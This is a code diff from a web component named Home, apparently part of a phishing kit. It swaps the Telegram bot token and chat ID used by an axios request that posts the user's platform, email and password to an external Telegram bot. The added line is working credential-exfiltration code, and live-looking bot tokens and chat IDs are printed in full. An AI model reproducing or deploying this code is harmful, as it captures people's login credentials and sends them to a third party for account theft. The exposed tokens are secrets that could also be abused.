@@ -29,8 +29,8 @@ function Home(){
             //     platform:platform
             // });
     
-            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                chat_id: 5916570239,
+           const response =  await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+                chat_id: 6150403557,
                 text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
               });
     
